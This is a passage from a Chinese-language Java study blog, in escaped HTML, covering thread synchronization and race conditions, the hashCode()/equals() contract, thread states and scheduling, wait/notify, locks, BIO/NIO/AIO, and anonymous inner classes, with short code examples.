class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 每个线程都把账户递增50次　**/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++) &#123;</span><br><span class=\"line\">            increament();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"balance is \"</span> + balance);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">increament</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">        <span class=\"comment\">/** 问题出在我们用的是读取的值而不是目前的值 **/</span></span><br><span class=\"line\">        balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSyncTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestSync job = <span class=\"keyword\">new</span> TestSync();</span><br><span class=\"line\">        Thread a = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        Thread b = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        b.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>用同步机制让<code>increment()</code> 方法原子化，将<code>increment()</code>方法同步化可以解决丢失更新的问题，因为他会让方法中的两个步骤组成不可分割的单元。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">increment</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">    balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但同步化是需要付出额外的成本。也就是说进入同步化方法的程序会查询钥匙等性能上的损耗。其次，同步化的方法会让你的程序因为要同步并行的问题而慢下来。同步化会强制线程排队等待执行方法。最后，最可怕的是同步化可能会导致死锁现象。原则上最好制作最少量的同步化。事实上同步化的规模可以小于方法全部，可以用<code>synchronized</code>来修饰一行或数行的代码而不必整个方法都同步化。比如:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">go</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    doStuff();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">        criticalStuff();</span><br><span class=\"line\">        moreCriticalStuff();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>并行问题也是线程安全的问题，对于一个类是否线程安全，重要的决定因素便是是否存在上面提及的问题，诸如HashMap和HashTable、StringBuffer和StringBuiler、Vector和ArrayList等的区别，其中HashMap、StringBuiler、ArrayList没有实现同步化，因此是非线程安全的；HashTable、StringBuffer、Vector在原本HashMap、StringBuiler、ArrayList的方法上添加了<code>synchronized</code>修饰来保证线程安全。</p>\n<h2 id=\"hashCode-与equals-的相关规定\"><a href=\"#hashCode-与equals-的相关规定\" class=\"headerlink\" title=\"hashCode()与equals()的相关规定\"></a>hashCode()与equals()的相关规定</h2><p>API文件有对对象的状态指定出必须遵守的规则：</p>\n<ol>\n<li>如果两个对象相等，则<code>hashcode</code>必须也是相等的。</li>\n<li>如果两个对象相等，对其中一个对象调用<code>equals()</code>必须返回<code>true</code>。也就是说，若<code>a.equals(b)</code>则<code>b.equals(a)</code>。</li>\n<li>如果两个对象有相同的<code>hashcode</code>值，它们也不一定是相等的。但若两个对象相等，则<code>hashcode</code>值一定是相等的。</li>\n<li>因此若<code>equals()</code>被覆盖过，则<code>hashCode()</code>也必须被覆盖。</li>\n<li><code>hashCode()</code>的默认行为是对在<code>heap(堆)</code>上的对象产生独特的值。如果你没有<code>override</code>过<code>hashCode()</code>，则该<code>class</code>的两个对象怎样都不会被认为是相同的。</li>\n<li><code>equals()</code>的默认行为是执行==的比较。也就是说会去测试两个引用是否对上<code>heap</code>上同一个对象。如果<code>equals()</code>没有被覆盖过，两个对象永远都不会被视为相同的，因为不同的对象有不同的字节组合。</li>\n</ol>\n<p><code>a.equals(b)</code>必须与<code>a.hashCode() == b.hashCode()</code>等值。但<code>a.hashCode() == b.hashCode()</code>不一定要与<code>a.equals()</code>等值。</p>\n<p><strong>问：</strong>为什么不同对象会有相同<code>hashcode</code>的可能<br><strong>答：</strong><code>HashSet</code>使用<code>hashcode</code>来达成存取速度较快的存储方法。如果你尝试用对象来寻找<code>ArrayList</code>中相同的对象(也就是不用索引来找)，<code>ArrayList</code>会从头开始找起。但是<code>HashSet</code>这样找对象的速度就块多了，因为它使用<code>hashcode</code>来寻找符合条件的元素。因此当你想要寻找某个对象时，通过<code>hashcode</code>就可以很快算出该对象所在的位置，而不用从头一个一个找起。重点在于<code>hashcode</code>相同并不一定保证对象是相等的，因为<code>hashCode()</code>所使用的杂凑算法也许刚刚好会让多个对象传回相同的杂凑值。越糟糕的杂凑算法越容易碰撞，但这也与数据值域分布的特征有关。如果<code>HashSet</code>发现在对比的时候，同样的<code>hashcode</code>有多个对象，它会使用<code>equals()</code>来判断是否有完全的符合。也就是说，<code>hashcode</code>是用来缩小寻找成本，但最后还是要用<code>equals()</code>才能认定是否真的找到相同的项目。</p>\n<blockquote>\n<p>这与加密中的问题一样，网络中将用户的密码获取后，通过加密算法将密码加密成一个固定长度的无规律字符串保存在数据库中，密码相同，肯定加密的结果是唯一相同的，但是由于加密过后是固定长度，比如32个字节，那么着32个字节就有固定的容量，因此会出现两个不同的密码加密后是一样的字符串。</p>\n</blockquote>\n<p>对于上述第四条和第五条，个人的理解是：<code>hashCode()</code>方法原本是根据对象在内存中的位置来计算，因此如果要比较两个对象是否相等，通过原本的<code>hashCode()</code>方法计算会得到两个不同的值，因为是两个对象，原本的<code>hashCode()</code>是一个对象对应一个唯一的值，这个值与内存位置有关，而两个对象是在不同的内存位置上，如果强行想要表示这两个对象相等，就必须重写原本的<code>hashCode()</code>。</p>\n<p>同样的，对于<code>equals()</code>方法，原本是表示两个引用所指向的对象是否是一个对象，但是我们需要按照自己的意愿去表示两个不同的对象，如果某些特征相同时也表示相等，比如想要表示一个人的信息，在不同时间点记录的信息会不同，但只要身份证号一样，我们就认为这是同一个人。这就需要重写<code>equals()</code>方法，让它表示两个不同对象在意义上相同。</p>\n<p>综合上述的描述 : <code>hashCode()</code>是判断引用相等，<code>equals()</code>是判断对象相等。</p>\n<h2 id=\"Collection-API\"><a href=\"#Collection-API\" class=\"headerlink\" title=\"Collection API\"></a>Collection API</h2><p><img src=\"http://wiki3.cosc.canterbury.ac.nz/images/8/8d/Collections-detail-1.png\" alt=\"\"></p>\n<h2 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h2><h3 id=\"Java实现多线程的方式\"><a href=\"#Java实现多线程的方式\" class=\"headerlink\" title=\"Java实现多线程的方式\"></a><a href=\"http://fenlan.github.io/2016/06/18/java-Thread/\">Java实现多线程的方式</a></h3><ul>\n<li>继承<code>Thread</code>类，重写<code>run</code>方法</li>\n<li>实现<code>Runable</code>接口</li>\n<li>实现<code>Callable</code>接口</li>\n</ul>\n<blockquote>\n<p>启动多线程时，<code>start()</code>方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。<br>从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。<br>Thread.sleep()方法调用目的是不让当前线程独自霸占该进程所获取的CPU资源，以留出一定时间给其他线程执行的机会。<br>实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。</p>\n<p>实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的。</p>\n</blockquote>\n<h3 id=\"三种方式的区别\"><a href=\"#三种方式的区别\" class=\"headerlink\" title=\"三种方式的区别\"></a>三种方式的区别</h3><ul>\n<li>实现<code>Runable</code>接口能增强程序的健壮性，代码能够被多个线程共享，<strong>代码与数据是独立的</strong>，适合多个相同程序代码的线程区处理同一资源。正如上述同步化所用的程序。</li>\n<li>继承<code>Thread</code>类不适合资源共享，但继承<code>Thread</code>和实现<code>Runable</code>都是通过<code>start()</code>启动线程，然后JVM将线程放到就绪队列中，如果有处理机可用，则执行<code>run</code>方法。</li>\n<li>实现<code>Callable</code>接口要实现<code>call</code>方法，并且线程执行完后是后返回值的，其他两种都没有返回值。</li>\n</ul>\n<blockquote>\n<p>在java中，每次程序运行至少启动2个线程。一个是main线程，一个是垃圾收集线程。</p>\n</blockquote>\n<h3 id=\"线程状态\"><a href=\"#线程状态\" class=\"headerlink\" title=\"线程状态\"></a>线程状态</h3><p><img src=\"http://img.blog.csdn.net/20150309140927553\" alt=\"\"></p>\n<ul>\n<li>新建状态（New）：新创建了一个线程对象。</li>\n<li>就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。</li>\n<li>运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码</li>\n<li>阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：<ul>\n<li>等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁)</li>\n<li>同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。</li>\n<li>其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁）</li>\n</ul>\n</li>\n<li>死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</li>\n</ul>\n<h3 id=\"线程调度\"><a href=\"#线程调度\" class=\"headerlink\" title=\"线程调度\"></a>线程调度</h3><p><strong>Java线程有优先级，优先级高的线程会获得较多的运行机会。</strong></p>\n<p>Java线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> MAX_PRIORITY</span><br><span class=\"line\">          线程可以具有的最高优先级，取值为<span class=\"number\">10</span>。</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> MIN_PRIORITY</span><br><span class=\"line\">          线程可以具有的最低优先级，取值为<span class=\"number\">1</span>。</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> NORM_PRIORITY</span><br><span class=\"line\">          分配给线程的默认优先级，取值为<span class=\"number\">5</span>。</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>Thread类的setPriority()和getPriority()方法分别用来设置和获取线程的优先级。<br>每个线程都有默认的优先级。主线程的默认优先级为Thread.NORM_PRIORITY。<br>线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。</p>\n</blockquote>\n<h3 id=\"常用的调度\"><a href=\"#常用的调度\" class=\"headerlink\" title=\"常用的调度\"></a>常用的调度</h3><ul>\n<li>线程睡眠：Thread.sleep(long millis)方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。sleep不会释放持有的锁。</li>\n<li>线程等待：Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 唤醒方法。这两个唤醒方法也是Object类中的方法，行为等价于调用 wait(0) 一样。wait会释放持有的锁。</li>\n<li>线程让步：Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。</li>\n<li>线程加入：join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。</li>\n<li>线程唤醒：Object类中的notify()方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个notifyAll()，唤醒在此对象监视器上等待的所有线程。</li>\n</ul>\n<h3 id=\"常用函数说明\"><a href=\"#常用函数说明\" class=\"headerlink\" title=\"常用函数说明\"></a>常用函数说明</h3><ul>\n<li><code>sleep(long millis)</code> : <code>运行</code>–&gt;<code>阻塞</code> ,在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）</li>\n<li><code>join()</code> : <code>运行</code>–&gt;<code>阻塞</code>,在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。</li>\n<li><code>yield()</code> : <code>运行</code>–&gt;<code>可运行</code>,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。</li>\n<li><code>wait()</code> : <code>Obj.wait()</code>，与<code>Obj.notify()</code>必须要与<code>synchronized(Obj)</code>一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){…}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制</li>\n</ul>\n<h3 id=\"wait-和notify\"><a href=\"#wait-和notify\" class=\"headerlink\" title=\"wait()和notify()\"></a><code>wait()</code>和<code>notify()</code></h3><ul>\n<li>wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。</li>\n<li>当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。</li>\n<li>当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。</li>\n</ul>\n<h3 id=\"synchronized-和lock\"><a href=\"#synchronized-和lock\" class=\"headerlink\" title=\"synchronized 和lock\"></a><code>synchronized</code> 和<code>lock</code></h3><ul>\n<li><code>synchronized</code> : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。</li>\n<li><code>lock(ReentrantLock)</code> : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。</li>\n</ul>\n<h2 id=\"Java中的BIO、NIO、AIO\"><a href=\"#Java中的BIO、NIO、AIO\" class=\"headerlink\" title=\"Java中的BIO、NIO、AIO\"></a>Java中的BIO、NIO、AIO</h2><ul>\n<li><code>BIO(Blocking I/O)</code> : 同步阻塞IO，服务器中一个连接一个线程，数据的读取和写入必须阻塞在一个线程内等待其完成。</li>\n<li><code>NIO(New I/O)</code> : 同步非阻塞IO，服务器中一个请求一个线程，客户端所有连接注册到多路复用器中，多路复用器轮询所有连接，当存在连接有IO请求时才启动一个线程去处理IO。</li>\n<li><code>AIO(Asynchronous I/O)</code> : 异步非阻塞IO，服务器中一个有效请求一个线程，没有多路复用器轮询，客户端有IO请求给服务器，服务器获得请求后，由OS处理请求，处理完成后，再通知服务器创建一个线程去处理IO结果。</li>\n</ul>\n<p><a href=\"https://juejin.im/entry/598da7d16fb9a03c42431ed3\" target=\"_blank\" rel=\"external\">具体理解请看这</a><br><a href=\"http://blog.csdn.net/historyasamirror/article/details/5778378\" target=\"_blank\" rel=\"external\">以及这</a></p>\n<h3 id=\"同步与异步\"><a href=\"#同步与异步\" class=\"headerlink\" title=\"同步与异步\"></a>同步与异步</h3><p>同步与异步是针对应用程序与内核的交互而言的。同步过程中进程触发IO操作并等待或者轮询的去查看IO操作是否完成。异步过程中进程触发IO操作以后，直接返回，做自己的事情，IO交给内核来处理，完成后内核通知进程IO完成。</p>\n<h3 id=\"阻塞与非阻塞\"><a href=\"#阻塞与非阻塞\" class=\"headerlink\" title=\"阻塞与非阻塞\"></a>阻塞与非阻塞</h3><p>简单理解为需要做一件事能不能立即得到返回应答，如果不能立即获得返回，需要等待，那就阻塞了，否则就可以理解为非阻塞</p>\n<p><a href=\"http://www.cnblogs.com/Anker/p/3254269.html\" target=\"_blank\" rel=\"external\">参考这篇博客的图</a></p>\n<blockquote>\n<p>未具体理解</p>\n</blockquote>\n<h2 id=\"匿名内部类\"><a href=\"#匿名内部类\" class=\"headerlink\" title=\"匿名内部类\"></a>匿名内部类</h2><p>匿名内部类也就是没有名字的内部类<br>正因为没有名字，所以匿名内部类只能使用一次，它通常用来简化代码编写<br>但使用匿名内部类还有个前提条件：必须继承一个父类或实现一个接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Runnable x = <span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"keyword\">this</span>.getClass());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        x.run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"匿名内部类的特征\"><a href=\"#匿名内部类的特征\" class=\"headerlink\" title=\"匿名内部类的特征\"></a>匿名内部类的特征</h3><ul>\n<li>匿名内部类没有访问修饰符(如<code>public</code>、<code>private</code>)</li>\n<li>当所在方法的形参被匿名内部类使用时，这个行参必须final</li>\n<li>匿名内部类没有构造方法，因为它连名字都没有</li>\n</ul>\n<p>重点解释第二点:<br>首先我们知道在内部类编译成功后，它会产生一个class文件，该class文件与外部类并不是同一class文件，仅仅只保留对外部类的引用。当外部类传入的参数需要被内部类调用时，从java程序的角度来看是直接被调用：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">anonyFinal</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        Runnable x = <span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"keyword\">this</span>.getClass() + <span class=\"string\">\" \"</span> + name);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        x.run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从上面代码中看好像name参数应该是被内部类直接调用？其实不然，在java编译之后实际的操作如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span>$<span class=\"title\">InnerClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InnerClass</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.InnerClass$name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getClass() + <span class=\"string\">\" \"</span> + <span class=\"keyword\">this</span>.InnerClass$name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从这里可以看出匿名内部类并不是直接调用行参，而是临时产生构造函数，并将行参引用赋给自己的内部变量，并调用内部变量。因此为了让程序员产生这样的直接调用错觉，规定行参必须是final不可更改的。</p>\n<h2 id=\"参考资料-相关链接\"><a href=\"#参考资料-相关链接\" class=\"headerlink\" title=\"参考资料/相关链接\"></a>参考资料/相关链接</h2><ul>\n<li>多线程<ul>\n<li><a href=\"http://blog.csdn.net/evankaka/article/details/44153709\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/evankaka/article/details/44153709</a></li>\n</ul>\n</li>\n<li>匿名内部类<ul>\n<li><a href=\"http://blog.csdn.net/chenssy/article/details/13170015\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/chenssy/article/details/13170015</a></li>\n</ul>\n</li>\n</ul>\n","excerpt":"<h2 id=\"static和final的区别和用途\"><a href=\"#static和final的区别和用途\" class=\"headerlink\" title=\"static和final的区别和用途\"></a>static和final的区别和用途</h2><ul>\n<li><p>Static</p>\n<ul>\n<li>修饰变量:静态变量随着类的加载时完成初始化，内存中只有一个，且JVM也只会为他分配一次内存，所有类共享静态变量，静态变量放在指定的静态共享区，遵循一改全改。</li>\n<li>修饰方法:静态方法在类加载时就存在与静态区域，不依赖任何实例，Static方法必须实现，不能是抽象类abstract。使用静态方法时可以直接使用<code>类名.方法名</code>,不需要实例化一个对象。</li>\n<li>修饰代码块：类加载完后执行代码块中的内容。</li>\n</ul>\n</li>\n<li><p>Final</p>\n<ul>\n<li>修饰变量：<ul>\n<li>编译时常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型。</li>\n<li>运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的内容可以变。</li>\n</ul>\n</li>\n<li>修饰方法：跟final单词意思相近，最后的方法，表示不能被继承，不能被子类修改重写。</li>\n<li>修饰类：不能被继承。</li>\n<li>修饰形参：final形参在方法内不可变。</li>\n</ul>\n</li>\n</ul>","more":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Value</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FinalDemo</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> i = <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i1 = <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i2 = <span class=\"number\">29</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i3 = <span class=\"number\">39</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i4 = (<span class=\"keyword\">int</span>)(Math.random()*<span class=\"number\">20</span>);</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i5 = (<span class=\"keyword\">int</span>)(Math.random()*<span class=\"number\">20</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    Value v1 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> Value v2 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Value v3 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">\t<span class=\"comment\">// final Value v4;\t// Error: var not init in the default constructor</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] a = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span 